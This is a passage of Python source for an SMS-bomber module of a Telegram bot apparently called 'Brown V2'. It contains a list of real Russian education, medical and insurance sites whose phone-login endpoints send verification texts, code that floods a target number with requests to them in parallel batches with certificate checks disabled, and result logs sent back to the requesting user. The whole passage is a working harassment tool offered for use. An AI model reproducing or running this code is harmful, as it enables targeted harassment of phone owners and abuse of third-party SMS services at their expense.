                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 89. Учёба.ру ─────────────────────────────────────────────────────
        {
            "name": "Учёба.ру",
            "method": "POST",
            "url": "https://www.ucheba.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 90. Skillbox ─────────────────────────────────────────────────────
        {
            "name": "Skillbox",
            "method": "POST",
            "url": "https://skillbox.ru/api/v1/auth/phone/send-code",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 91. Geekbrains ───────────────────────────────────────────────────
        {
            "name": "Geekbrains",
            "method": "POST",
            "url": "https://gb.ru/api/v1/users/send_sms",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 92. Яндекс.Практикум ─────────────────────────────────────────────
        {
            "name": "Яндекс.Практикум",
            "method": "POST",
            "url": "https://practicum.yandex.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 93. Сбер.Класс ───────────────────────────────────────────────────
        {
            "name": "СберКласс",
            "method": "POST",
            "url": "https://sber-class.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 94. Медси ────────────────────────────────────────────────────────
        {
            "name": "Медси",
            "method": "POST",
            "url": "https://medsi.ru/api/v1/auth/phone/sms",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 95. Гемотест ─────────────────────────────────────────────────────
        {
            "name": "Гемотест",
            "method": "POST",
            "url": "https://gemotest.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 96. INVITRO ──────────────────────────────────────────────────────
        {
            "name": "INVITRO",
            "method": "POST",
            "url": "https://www.invitro.ru/api/v1/auth/otp",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 97. Doctis ───────────────────────────────────────────────────────
        {
            "name": "Doctis",
            "method": "POST",
            "url": "https://doctis.ru/api/v2/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 98. СберЗдоровье ─────────────────────────────────────────────────
        {
            "name": "СберЗдоровье",
            "method": "POST",
            "url": "https://sberzdorovie.ru/api/v3/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 99. ПолисОнлайн ──────────────────────────────────────────────────
        {
            "name": "ПолисОнлайн",
            "method": "POST",
            "url": "https://polisonline.ru/api/v1/auth/phone",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
        # ── 100. Тинькофф Страхование ────────────────────────────────────────
        {
            "name": "Tinkoff Страхование",
            "method": "POST",
            "url": "https://insurance.tinkoff.ru/api/v1/auth/send-sms",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0",
            },
            "json": {"phone": phone_plus},
            "success_codes": [200, 400],
        },
    ]

    return services


async def _send_one(session: aiohttp.ClientSession, service: dict, idx: int) -> tuple[str, str, str]:
    """
    Отправляет один запрос к сервису.
    Возвращает (name, status_str, code)
    """
    name = service["name"]
    url = service["url"]
    method = service.get("method", "POST")
    headers = service.get("headers", {})
    json_data = service.get("json")
    form_data = service.get("data")
    success_codes = service.get("success_codes", [200])

    try:
        timeout = aiohttp.ClientTimeout(total=TIMEOUT)
        if method == "POST":
            if json_data is not None:
                async with session.post(url, json=json_data, headers=headers, timeout=timeout, ssl=False) as resp:
                    code = str(resp.status)
                    ok = resp.status in success_codes
            elif form_data is not None:
                async with session.post(url, data=form_data, headers=headers, timeout=timeout, ssl=False) as resp:
                    code = str(resp.status)
                    ok = resp.status in success_codes
            else:
                async with session.post(url, headers=headers, timeout=timeout, ssl=False) as resp:
                    code = str(resp.status)
                    ok = resp.status in success_codes
        else:
            async with session.get(url, headers=headers, timeout=timeout, ssl=False) as resp:
                code = str(resp.status)
                ok = resp.status in success_codes

        status_str = "✅" if ok else "❌"
        print(f"[SMS] #{idx:03d} {name:25s} → {status_str} {code}", flush=True)
        return name, status_str, code

    except asyncio.TimeoutError:
        print(f"[SMS] #{idx:03d} {name:25s} → ⏱ TIMEOUT", flush=True)
        return name, "⏱", "TIMEOUT"
    except Exception as e:
        short_err = str(e)[:40]
        print(f"[SMS] #{idx:03d} {name:25s} → ❌ ERR: {short_err}", flush=True)
        return name, "❌", f"ERR: {short_err}"


async def main_sms_snos(phone: str, user_id: int, username: str):
    """
    Основная функция SMS бомбера.
    phone — в формате 79991234567 (без +, без пробелов)
    """
    from config import bot_logs
    import keyboards
    from aiogram import types as aiogram_types

    services = _build_services(phone)
    total = len(services)

    print(f"\n{'='*55}", flush=True)
    print(f"[SMS] 🚀 Запуск SMS-бомбера", flush=True)
    print(f"[SMS] 📱 Номер: +{phone}", flush=True)
    print(f"[SMS] 👤 {user_id} (@{username})", flush=True)
    print(f"[SMS] 🎯 Сервисов: {total}", flush=True)
    print(f"{'='*55}", flush=True)

    results = []

    connector = aiohttp.TCPConnector(ssl=False, limit=BATCH_SIZE)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Разбиваем на пачки по BATCH_SIZE
        for batch_start in range(0, total, BATCH_SIZE):
            batch = services[batch_start: batch_start + BATCH_SIZE]
            tasks = [
                _send_one(session, svc, batch_start + i + 1)
                for i, svc in enumerate(batch)
            ]
            batch_results = await asyncio.gather(*tasks, return_exceptions=False)
            results.extend(batch_results)
            # Небольшая пауза между пачками
            if batch_start + BATCH_SIZE < total:
                await asyncio.sleep(1.5)

    ok = sum(1 for _, s, _ in results if s == "✅")
    timeout = sum(1 for _, s, _ in results if s == "⏱")
    err = sum(1 for _, s, _ in results if s == "❌")

    print(f"\n[SMS] {'='*55}", flush=True)
    print(f"[SMS] 🏁 Итоги: ✅ {ok} | ⏱ {timeout} | ❌ {err}", flush=True)
    print(f"[SMS] {'='*55}\n", flush=True)

    # Формируем лог
    log_lines = [
        "Brown V2 | SMS-бомбер",
        "=" * 50,
        f"Пользователь : {user_id} (@{username})",
        f"Номер        : +{phone}",
        f"Сервисов     : {total}",
        f"Дата         : {now_msk().strftime('%Y-%m-%d %H:%M:%S')}",
        "=" * 50,
        "",
    ]
    for name, status, code in results:
        log_lines.append(f"{status}  {name:30s} [{code}]")

    log_lines += [
        "",
        "=" * 50,
        f"✅ Успешно : {ok}",
        f"⏱ Таймаут : {timeout}",
        f"❌ Ошибок  : {err}",
    ]

    log_name = f"brown_v2_sms_{os.urandom(4).hex()}.txt"
    log_path = os.path.join(LOG_FOLDER, log_name)
    with open(log_path, "w", encoding="utf-8") as f:
        f.write("\n".join(log_lines))

    caption_user = (
        f"📱 *SMS-бомбер завершён!*\n"
        f"*└─ Номер:* `+{phone}`\n\n"
        f"*Сервисов:* `{total}`\n"
        f"✅ *Успешно: {ok}*\n"
        f"⏱ *Таймаут: {timeout}*\n"
        f"❌ *Ошибок: {err}*"
    )
    caption_log = (
        f"📱 *SMS-бомбер*\n"
        f"*└─ Номер:* `+{phone}`\n"
        f"✅ {ok} | ⏱ {timeout} | ❌ {err}\n"
        f"👤 {user_id} (@{username})"
    )

    try:
        await bot.send_document(
            user_id,
            aiogram_types.InputFile(log_path),
            caption=caption_user,
            parse_mode="Markdown",
            reply_markup=keyboards.main_menu,
        )
        await bot.send_document(
            bot_logs,
            aiogram_types.InputFile(log_path),
            caption=caption_log,
            parse_mode="Markdown",
        )
    except Exception as e:
        print(f"[SMS] Ошибка отправки лога: {e}", flush=True)

    try:
        os.remove(log_path)
    except Exception:
        pass
